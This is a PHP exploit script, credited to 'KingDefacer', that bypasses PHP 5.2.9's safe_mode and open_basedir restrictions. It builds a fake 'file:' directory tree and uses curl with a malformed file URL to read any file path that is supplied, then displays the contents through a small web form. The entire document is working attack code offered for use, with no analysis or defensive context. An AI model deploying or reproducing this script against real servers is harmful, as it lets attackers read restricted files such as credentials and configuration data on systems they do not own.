<?php
/*
safe_mode and open_basedir Bypass PHP 5.2.9
KingDefacer ARCHÝVES /
This Exploit Was Edited By KingDefacer
NOTE:

*/
error_reporting(0);
if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
echo '<PRE>
<p><form name="form" action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_NAME"]).$_SERVER["PHP_SELF"].'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form>';

$level=0;
if(!file_exists("file:"))
    mkdir("file:");
chdir("file:");
$level++;
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a]))
            mkdir($hardstyle[$a]);
        chdir($hardstyle[$a]);
        $level++;
    }
}
while($level--) chdir("..");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
echo '<FONT COLOR="RED"> <textarea rows="40" cols="120">';
if(FALSE==curl_exec($ch))
    die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
echo ' </textarea> </FONT>';
curl_close($ch);
?>